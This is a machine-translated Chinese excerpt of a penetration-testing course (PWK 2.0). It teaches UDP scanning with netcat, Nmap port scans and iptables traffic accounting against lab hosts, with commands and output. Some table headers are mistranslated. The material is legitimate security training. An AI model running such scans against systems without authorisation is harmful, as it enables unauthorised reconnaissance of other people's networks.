<div style="position:absolute;top:214856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv -u -z -w 1 10.11.1.115 160-162</font></font></font></b></nobr></div>
<div style="position:absolute;top:214873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.1.115] 161 (snmp) 打开</font></font></nobr></div>
<div style="position:absolute;top:214892;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 228 - 使用 Netcat 执行 UDP 端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Wireshark 的抓包中，我们可以看到 UDP 扫描使用了与 TCP 不同的机制</font></font></nobr></div>
<div style="position:absolute;top:214941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:215203;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="182"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 182 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:215236;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:216313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:216313;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:216313;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">182</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215498;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 43：Wireshark 捕获的 UDP Netcat 端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 43 所示，一个空的 UDP 数据包被发送到特定端口（数据包 3、5、6 和 7）。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:215549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标UDP端口打开，数据包将被传递到应用层和响应</font></font></nobr></div>
<div style="position:absolute;top:215568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接收将取决于应用程序如何编程以响应空数据包。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:215587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，应用程序不发送响应。</font><font style="vertical-align: inherit;">但是，如果目标 UDP 端口关闭，则</font></font></nobr></div>
<div style="position:absolute;top:215606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标应该响应一个 ICMP 端口不可达（如数据包 4 和 8 所示），由</font></font></nobr></div>
<div style="position:absolute;top:215626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标机器的 UDP/IP 堆栈。</font></font></nobr></div>
<div style="position:absolute;top:215659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数 UDP 扫描器倾向于使用标准的“ICMP 端口不可达”消息来推断状态</font></font></nobr></div>
<div style="position:absolute;top:215678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标端口。</font><font style="vertical-align: inherit;">但是，当目标端口被过滤时，这种方法可能完全不可靠</font></font></nobr></div>
<div style="position:absolute;top:215697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过防火墙。</font><font style="vertical-align: inherit;">事实上，在这些情况下，扫描器会将目标端口报告为打开，因为</font></font></nobr></div>
<div style="position:absolute;top:215717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缺少 ICMP 消息。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:215751;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.1.3 常见的端口扫描陷阱</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于多种原因，UDP 扫描可能会出现问题。</font><font style="vertical-align: inherit;">首先，UDP 扫描通常是不可靠的，因为</font></font></nobr></div>
<div style="position:absolute;top:215805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙和路由器可能会丢弃 ICMP 数据包。</font><font style="vertical-align: inherit;">这可能会导致误报和端口显示</font></font></nobr></div>
<div style="position:absolute;top:215824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当它们实际上是封闭的时，它们是开放的。</font><font style="vertical-align: inherit;">其次，很多端口扫描器不会扫描所有可用的端口，</font></font></nobr></div>
<div style="position:absolute;top:215843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且通常有一个预先设置的“有趣的端口”列表被扫描。</font><font style="vertical-align: inherit;">这意味着打开 UDP 端口</font></font></nobr></div>
<div style="position:absolute;top:215863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以被忽视。</font><font style="vertical-align: inherit;">使用特定于协议的 UDP 端口扫描器可能有助于获得更准确的</font></font></nobr></div>
<div style="position:absolute;top:215882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果。</font><font style="vertical-align: inherit;">最后，渗透测试人员经常忘记扫描开放的 UDP 端口，而是专注于</font></font></nobr></div>
<div style="position:absolute;top:215902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“更令人兴奋”的 TCP 端口。</font><font style="vertical-align: inherit;">尽管 UDP 扫描可能不可靠，但存在大量攻击</font></font></nobr></div>
<div style="position:absolute;top:215921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">潜伏在开放 UDP 端口后面的向量。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:215955;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2 使用 Nmap 进行端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">196</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（由 Gordon Lyon，又名 Fyodor 编写）是最受欢迎、功能多样且功能强大的端口之一</font></font></nobr></div>
<div style="position:absolute;top:216013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用扫描仪。</font><font style="vertical-align: inherit;">它已经积极开发了十多年，并具有许多功能</font></font></nobr></div>
<div style="position:absolute;top:216032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了端口扫描。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:216094;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在本模块中介绍的一些 Nmap 示例扫描是使用</font></font></i><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo</font></font></font></b><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">运行的</font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></i></nobr></div>
<div style="position:absolute;top:216113;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是因为相当多的 Nmap 扫描选项需要访问</font></font></i></nobr></div>
<div style="position:absolute;top:216133;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始套接字，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">197 个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，反过来需要 root 权限。</font><font style="vertical-align: inherit;">原始套接字允许</font></font></i></nobr></div>
<div style="position:absolute;top:216152;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 和 UDP 数据包的外科手术操作。</font><font style="vertical-align: inherit;">无法访问原始套接字，</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:216243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">196 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），http://nmap.org/</font></font></font></nobr></div>
<div style="position:absolute;top:216263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">197 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Man7，2017），http://man7.org/linux/man-pages/man7/raw.7.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:216391;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="183"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 183 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:216424;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:217501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:217501;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:217501;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">183</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:216520;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 是有限的，因为它回退到使用标准伯克利制作数据包</font></font></i></nobr></div>
<div style="position:absolute;top:216539;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">套接字 API。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">198</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:216601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们探索一些端口扫描示例，以更好地了解 Nmap 及其选项。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:216635;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.1 对我们流量的问责</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:216670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认的 Nmap TCP 扫描将扫描给定机器上 1000 个最流行的端口。</font><font style="vertical-align: inherit;">在我们之前</font></font></nobr></div>
<div style="position:absolute;top:216689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始盲目地运行扫描，让我们检查这种类型的扫描发送的流量。</font><font style="vertical-align: inherit;">我们会扫描</font></font></nobr></div>
<div style="position:absolute;top:216709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一台实验室机器，同时使用监控发送到目标主机的流量</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:216729;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">199</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:216761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用几个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项。</font><font style="vertical-align: inherit;">首先，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-I</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项将新规则插入到</font></font></nobr></div>
<div style="position:absolute;top:216780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给定链，在本例中包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INPUT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（入站）和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OUTPUT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（出站）链</font></font></nobr></div>
<div style="position:absolute;top:216800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟规则编号。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定源 IP 地址，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定一个</font></font></nobr></div>
<div style="position:absolute;top:216819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标 IP 地址和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-j</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流量。</font><font style="vertical-align: inherit;">最后，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Z</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项将</font></font></nobr></div>
<div style="position:absolute;top:216839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有链中的数据包和字节计数器。</font></font></nobr></div>
<div style="position:absolute;top:216872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们运行这些命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:216906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT</font></font></font></b></nobr></div>
<div style="position:absolute;top:216940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT</font></font></font></b></nobr></div>
<div style="position:absolute;top:216974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo iptables -Z</font></font></font></b></nobr></div>
<div style="position:absolute;top:216993;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 229 - 为扫描配置我们的 iptables 规则</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成一些流量</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:217058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap 10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:217075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从美国东部时间 2019-03-04 11:20 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:217092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:217109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.29 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:217126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：980 个封闭端口</font></font></nobr></div>
<div style="position:absolute;top:217143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:217160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 打开 ftp</font></font></nobr></div>
<div style="position:absolute;top:217177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
<div style="position:absolute;top:217194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp 打开 kerberos-sec</font></font></nobr></div>
<div style="position:absolute;top:217211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:217228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:217245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389/tcp 打开 LDAP</font></font></nobr></div>
<div style="position:absolute;top:217261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:217278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464/tcp 打开 kpasswd5</font></font></nobr></div>
<div style="position:absolute;top:217295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593/tcp 打开 http-rpc-epmap</font></font></nobr></div>
<div style="position:absolute;top:217313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636/tcp 打开 ldapssl</font></font></nobr></div>
<div style="position:absolute;top:217330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3268/tcp 打开 globalcatLDAP</font></font></nobr></div>
<div style="position:absolute;top:217346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3269/tcp 打开 globalcatLDAPssl</font></font></nobr></div>
<div style="position:absolute;top:217363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:217431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">198 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Berkeley_sockets#Socket_API_functions</font></font></font></nobr></div>
<div style="position:absolute;top:217451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">199 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（netfilter，2014），http://netfilter.org/projects/iptables/index.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:217579;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="184"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 184 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:217612;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:218689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:218689;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:218689;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">184</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:217708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:217741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：46.29 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:217761;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 230 - 扫描 1000 个最流行的 TCP 端口的 IP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:217791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描完成并显示了一些开放的端口。</font></font></nobr></div>
<div style="position:absolute;top:217823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们看看一些</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">统计数据，以了解我们的扫描产生了多少流量。</font></font></nobr></div>
<div style="position:absolute;top:217842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项为我们的输出添加一些详细信息，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用数字输出，以及</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:217862;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出所有链中存在的规则：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:217897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo iptables -vn -L</font></font></font></b></nobr></div>
<div style="position:absolute;top:217914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chain INPUT（策略接受1528个数据包，226K字节）</font></font></nobr></div>
<div style="position:absolute;top:217931;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pkts 字节目标 prot 选择退出源    </font></font></nobr></div>
<div style="position:absolute;top:217931;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地    </font></font></nobr></div>
<div style="position:absolute;top:217948;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1263 51264 全部接受 -- * * 10.11.1.220    </font></font></nobr></div>
<div style="position:absolute;top:217948;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0/0    </font></font></nobr></div>
<div style="position:absolute;top:217982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chain FORWARD（策略接受 0 个数据包，0 个字节）</font></font></nobr></div>
<div style="position:absolute;top:217999;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pkts 字节目标 prot 选择退出源    </font></font></nobr></div>
<div style="position:absolute;top:217999;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地    </font></font></nobr></div>
<div style="position:absolute;top:218033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chain OUTPUT（策略接受1323个数据包，191K字节）</font></font></nobr></div>
<div style="position:absolute;top:218050;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pkts 字节目标 prot 选择退出源    </font></font></nobr></div>
<div style="position:absolute;top:218050;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的地    </font></font></nobr></div>
<div style="position:absolute;top:218066;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1314 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78300</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部接受 -- * * 0.0.0.0/0    </font></font></nobr></div>
<div style="position:absolute;top:218066;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220 </font></font></nobr></div>
<div style="position:absolute;top:218086;left:242"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 231 - 使用 iptables 监控前 1000 个端口扫描的 nmap 流量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:218116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据这个输出，这个默认的 1000 端口扫描产生了大约 78 KB 的流量。</font></font></nobr></div>
<div style="position:absolute;top:218148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -Z</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次将所有链中的数据包和字节计数器归零并运行另一个</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:218168;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定</font></font></font><i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有</font></font></font></i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 端口：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:218203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo iptables -Z</font></font></font></b></nobr></div>
<div style="position:absolute;top:218236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -p 1-65535 10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:218253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:27 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:218270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.220 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:218287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.00067 秒延迟）。</font></font></nobr></div>
